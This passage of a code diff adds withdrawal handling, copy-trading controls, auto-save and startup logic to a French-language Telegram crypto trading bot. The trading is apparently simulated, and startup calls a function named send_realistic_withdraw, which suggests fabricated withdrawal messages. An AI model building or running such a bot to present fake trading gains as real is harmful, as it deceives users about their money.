+                message = MESSAGES[lang]['copy_trade_start'].format(address=copy_trader_addresses[user_id])
+                show_menu(update, context, message)
+            else:
+                msg = context.bot.send_message(chat_id=user_id, text="❌ Aucune adresse de copy trader définie.")
+                add_user_message(user_id, msg.message_id, 'error')
+                schedule_message_deletion(context.bot, user_id, msg.message_id, MESSAGE_DURATIONS['error'])
+        elif action == 'stop':
+            stop_copy_trade_simulation(user_id)
+            message = MESSAGES[lang]['copy_trade_stop'].format(address=copy_trader_addresses[user_id])
+            show_menu(update, context, message)
+        return
+
+# --------------------- GESTION RETRAIT ---------------------
+def receive_address(update: Update, context: CallbackContext):
+    user_id = update.effective_user.id
+    lang = user_lang.get(user_id, 'fr')
+    text = update.message.text.strip()
+    
+    delete_message_safe(context.bot, user_id, update.message.message_id)
+    
+    if user_states.get(user_id) == "waiting_address":
+        user_withdraw_data[user_id] = {'address': text}
+        user_states[user_id] = "waiting_amount"
+        msg = context.bot.send_message(chat_id=user_id, text=MESSAGES[lang]['withdraw_prompt_amount'])
+        add_user_message(user_id, msg.message_id, 'withdraw_steps')
+    
+    elif user_states.get(user_id) == "waiting_amount":
+        try:
+            amount = float(text)
+        except:
+            msg = context.bot.send_message(chat_id=user_id, text="❌ Montant invalide.")
+            add_user_message(user_id, msg.message_id, 'error')
+            schedule_message_deletion(context.bot, user_id, msg.message_id, MESSAGE_DURATIONS['error'])
+            return
+        
+        if amount < 0.5:
+            msg = context.bot.send_message(chat_id=user_id, text=MESSAGES[lang]['withdraw_min'])
+            add_user_message(user_id, msg.message_id, 'error')
+            user_states.pop(user_id, None)
+            user_withdraw_data.pop(user_id, None)
+            schedule_message_deletion(context.bot, user_id, msg.message_id, MESSAGE_DURATIONS['error'])
+            threading.Timer(MESSAGE_DURATIONS['error'] + 1, lambda: show_menu_after_error(user_id, context, lang)).start()
+            return
+            
+        if amount > users[user_id]['balance']:
+            msg = context.bot.send_message(chat_id=user_id, text=MESSAGES[lang]['withdraw_fail'])
+            add_user_message(user_id, msg.message_id, 'error')
+            user_states.pop(user_id, None)
+            user_withdraw_data.pop(user_id, None)
+            schedule_message_deletion(context.bot, user_id, msg.message_id, MESSAGE_DURATIONS['error'])
+            threading.Timer(MESSAGE_DURATIONS['error'] + 1, lambda: show_menu_after_error(user_id, context, lang)).start()
+            return
+        
+        users[user_id]['balance'] -= amount
+        user_withdraw_data[user_id]['amount'] = amount
+        save_data()
+        
+        keyboard = [[InlineKeyboardButton("✅ Confirmer", callback_data="confirm_withdraw")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        msg = context.bot.send_message(chat_id=user_id, text=MESSAGES[lang]['withdraw_confirm'].format(
+            address=user_withdraw_data[user_id]['address'],
+            amount=user_withdraw_data[user_id]['amount']
+        ), reply_markup=reply_markup)
+        add_user_message(user_id, msg.message_id, 'withdraw_steps')
+        user_states[user_id] = "waiting_confirm"
+        
+    else:
+        receive_copy_trade_address(update, context)
+
+# --------------------- SAUVEGARDE AUTOMATIQUE ---------------------
+def auto_save():
+    """Sauvegarder automatiquement toutes les 5 minutes"""
+    save_data()
+    threading.Timer(300, auto_save).start()
+
+# --------------------- GESTION ARRÊT PROPRE ---------------------
+def shutdown_handler():
+    """Arrêter proprement tous les timers de trading et sauvegarder"""
+    print("Arrêt du bot en cours...")
+    
+    for user_id in list(trade_timers.keys()):
+        stop_trade_simulation(user_id)
+    for user_id in list(copy_trade_timers.keys()):
+        stop_copy_trade_simulation(user_id)
+    
+    save_data()
+    print("Données sauvegardées. Bot arrêté.")
+
+# --------------------- MAIN ---------------------
+def main():
+    load_data()
+    
+    for user_id, user_data in users.items():
+        if user_data.get('trading_active', False):
+            print(f"Restauration du trading pour l'utilisateur {user_id}")
+        if user_data.get('copy_trading_active', False):
+            print(f"Restauration du copy trading pour l'utilisateur {user_id}")
+    
+    updater = Updater(TOKEN)
+    dp = updater.dispatcher
+
+    dp.add_handler(CommandHandler("start", choose_language))
+    dp.add_handler(CallbackQueryHandler(button))
+    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, receive_address))
+
+    auto_save()
+    
+    import signal
+    def signal_handler(signum, frame):
+        shutdown_handler()
+        updater.stop()
+        exit(0)
+    
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+
+    updater.start_polling()
+    send_realistic_withdraw(updater.bot)
+    
+    print("Bot démarré avec sauvegarde des données activée")
+    updater.idle()
+
+if __name__ == "__main__":
+    main()
